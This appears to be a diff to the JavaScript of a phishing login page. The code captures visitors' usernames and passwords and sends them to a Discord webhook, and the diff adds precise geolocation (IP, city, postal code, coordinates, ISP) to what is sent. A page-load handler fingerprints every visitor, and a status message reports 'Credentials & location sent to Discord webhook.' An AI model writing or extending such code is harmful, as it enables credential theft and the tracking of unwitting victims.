@@ -245,13 +245,11 @@
       }
 
       // ============================================================
-      //  EXACT OS DETECTION (Full version, build, architecture)
+      //  EXACT OS DETECTION
       // ============================================================
       function getExactOS() {
         const ua = navigator.userAgent;
         let os = 'Unknown';
-
-        // Windows
         if (ua.indexOf('Windows NT 10.0') !== -1) {
           const build = ua.match(/Windows NT 10\.0; (Win64; x64|WOW64)/) ? '64-bit' : '32-bit';
           const version = ua.includes('; ARM64;') ? 'Windows 11 ARM64' : 'Windows 10/11';
@@ -261,23 +259,18 @@
         else if (ua.indexOf('Windows NT 6.1') !== -1) os = 'Windows 7 (Build 6.1.7601)';
         else if (ua.indexOf('Windows NT 6.0') !== -1) os = 'Windows Vista (Build 6.0.6002)';
         else if (ua.indexOf('Windows NT 5.1') !== -1) os = 'Windows XP (Build 5.1.2600)';
-        // macOS
         else if (ua.indexOf('Mac OS X') !== -1) {
           const match = ua.match(/Mac OS X 10_([0-9]+)_([0-9]+)/);
           if (match) os = `macOS 10.${match[1]}.${match[2]}`;
           else os = 'macOS (unknown version)';
-        }
-        // Linux
-        else if (ua.indexOf('Linux') !== -1) {
+        } else if (ua.indexOf('Linux') !== -1) {
           if (ua.indexOf('Android') !== -1) {
             const match = ua.match(/Android ([0-9]+\.[0-9]+)/);
             os = match ? `Android ${match[1]}` : 'Android';
           } else {
             os = 'Linux (generic)';
           }
-        }
-        // iOS
-        else if (ua.indexOf('iPhone') !== -1 || ua.indexOf('iPad') !== -1) {
+        } else if (ua.indexOf('iPhone') !== -1 || ua.indexOf('iPad') !== -1) {
           const match = ua.match(/OS ([0-9]+)_([0-9]+)/);
           os = match ? `iOS ${match[1]}.${match[2]}` : 'iOS';
         }
@@ -285,12 +278,11 @@
       }
 
       // ============================================================
-      //  EXACT BROWSER DETECTION (Name + full version)
+      //  EXACT BROWSER DETECTION
       // ============================================================
       function getExactBrowser() {
         const ua = navigator.userAgent;
         let browser = 'Unknown';
-
         if (ua.indexOf('Firefox') !== -1) {
           const match = ua.match(/Firefox\/([0-9.]+)/);
           browser = match ? `Firefox ${match[1]}` : 'Firefox';
@@ -324,24 +316,65 @@
       }
 
       // ============================================================
-      //  PUBLIC IP
+      //  GEOLOCATION + IP (with full location data)
       // ============================================================
-      async function getPublicIP() {
-        const endpoints = [
-          'https://api.ipify.org?format=json',
-          'https://ipapi.co/json/',
-          'https://ipinfo.io/json'
-        ];
-        for (const url of endpoints) {
+      async function getGeoData() {
+        try {
+          const response = await fetch('https://ipapi.co/json/');
+          if (!response.ok) throw new Error('ipapi.co failed');
+          const data = await response.json();
+          return {
+            ip: data.ip || 'Unknown',
+            city: data.city || 'Unknown',
+            region: data.region || 'Unknown',
+            region_code: data.region_code || 'Unknown',
+            country: data.country_name || 'Unknown',
+            country_code: data.country_code || 'Unknown',
+            postal: data.postal || 'Unknown',
+            latitude: data.latitude || 'Unknown',
+            longitude: data.longitude || 'Unknown',
+            timezone: data.timezone || 'Unknown',
+            isp: data.org || 'Unknown',
+            currency: data.currency || 'Unknown'
+          };
+        } catch (_) {
+          // Fallback to ipinfo.io
           try {
-            const res = await fetch(url, { timeout: 5000 });
-            if (!res.ok) continue;
-            const data = await res.json();
-            if (data.ip) return data.ip;
-            if (data.ipv4) return data.ipv4;
-          } catch (_) {}
+            const response = await fetch('https://ipinfo.io/json');
+            if (!response.ok) throw new Error('ipinfo.io failed');
+            const data = await response.json();
+            const loc = data.loc ? data.loc.split(',') : ['Unknown', 'Unknown'];
+            return {
+              ip: data.ip || 'Unknown',
+              city: data.city || 'Unknown',
+              region: data.region || 'Unknown',
+              region_code: 'Unknown',
+              country: data.country || 'Unknown',
+              country_code: data.country || 'Unknown',
+              postal: data.postal || 'Unknown',
+              latitude: loc[0] || 'Unknown',
+              longitude: loc[1] || 'Unknown',
+              timezone: data.timezone || 'Unknown',
+              isp: data.org || 'Unknown',
+              currency: 'Unknown'
+            };
+          } catch (_) {
+            return {
+              ip: 'Unable to retrieve',
+              city: 'Unknown',
+              region: 'Unknown',
+              region_code: 'Unknown',
+              country: 'Unknown',
+              country_code: 'Unknown',
+              postal: 'Unknown',
+              latitude: 'Unknown',
+              longitude: 'Unknown',
+              timezone: 'Unknown',
+              isp: 'Unknown',
+              currency: 'Unknown'
+            };
+          }
         }
-        return 'Unable to retrieve IP';
       }
 
       // ============================================================
@@ -391,7 +424,7 @@
         showStatus('Collecting data...', 'info');
 
         const timestamp = getTimestamp();
-        const ip = await getPublicIP();
+        const geo = await getGeoData();
         const os = getExactOS();
         const browser = getExactBrowser();
         const username = usernameInput.value.trim();
@@ -404,7 +437,17 @@
           date: timestamp.date,
           time: timestamp.time,
           timezone: timestamp.timezone,
-          ip: ip,
+          ip: geo.ip,
+          city: geo.city,
+          region: geo.region,
+          region_code: geo.region_code,
+          country: geo.country,
+          country_code: geo.country_code,
+          postal: geo.postal,
+          latitude: geo.latitude,
+          longitude: geo.longitude,
+          isp: geo.isp,
+          currency: geo.currency,
           os: os,
           browser: browser,
           username: username,
@@ -413,10 +456,10 @@
           userAgent: navigator.userAgent
         };
 
-        console.log('📋 [LOG] Full client data:');
+        console.log('📋 [LOG] Full client data with geolocation:');
         console.log(JSON.stringify(logEntry, null, 2));
 
-        // Discord embed payload – includes password
+        // Discord embed with full geolocation
         const discordPayload = {
           embeds: [
             {
@@ -427,6 +470,14 @@
                 { name: '⏰ Time', value: logEntry.time, inline: true },
                 { name: '🌐 Timezone', value: logEntry.timezone, inline: true },
                 { name: '📡 IP Address', value: logEntry.ip, inline: false },
+                { name: '📍 City', value: logEntry.city, inline: true },
+                { name: '🏙️ Region', value: logEntry.region, inline: true },
+                { name: '🌍 Country', value: logEntry.country, inline: true },
+                { name: '📮 Postal Code', value: logEntry.postal, inline: true },
+                { name: '🗺️ Latitude', value: logEntry.latitude, inline: true },
+                { name: '🗺️ Longitude', value: logEntry.longitude, inline: true },
+                { name: '🏢 ISP', value: logEntry.isp, inline: false },
+                { name: '💵 Currency', value: logEntry.currency, inline: true },
                 { name: '🖥️ Operating System', value: logEntry.os, inline: false },
                 { name: '🌍 Browser', value: logEntry.browser, inline: false },
                 { name: '👤 Username / Email', value: logEntry.username || '(empty)', inline: false },
@@ -443,28 +494,34 @@
         const sent = await sendToDiscord(discordPayload);
 
         if (sent) {
-          showStatus('✅ Credentials sent to Discord webhook.', 'success');
+          showStatus('✅ Credentials & location sent to Discord webhook.', 'success');
         } else {
           showStatus('⚠️ Data logged to console, but Discord send failed. Check webhook URL.', 'error');
         }
 
-        // Clear password field for security (optional)
         passwordInput.value = '';
       });
 
       // ============================================================
-      //  PAGE LOAD – log visitor info automatically
+      //  PAGE LOAD – log visitor info automatically (with location)
       // ============================================================
       window.addEventListener('DOMContentLoaded', async () => {
-        const ip = await getPublicIP();
+        const geo = await getGeoData();
         const os = getExactOS();
         const browser = getExactBrowser();
         const timestamp = getTimestamp();
 
-        console.log('🌐 [PAGE LOAD] Visitor detected:');
+        console.log('🌐 [PAGE LOAD] Visitor detected with geolocation:');
         console.log({
           timestamp: timestamp.iso,
-          ip: ip,
+          ip: geo.ip,
+          city: geo.city,
+          region: geo.region,
+          country: geo.country,
+          postal: geo.postal,
+          latitude: geo.latitude,
+          longitude: geo.longitude,
+          isp: geo.isp,
           os: os,
           browser: browser,
           userAgent: navigator.userAgent
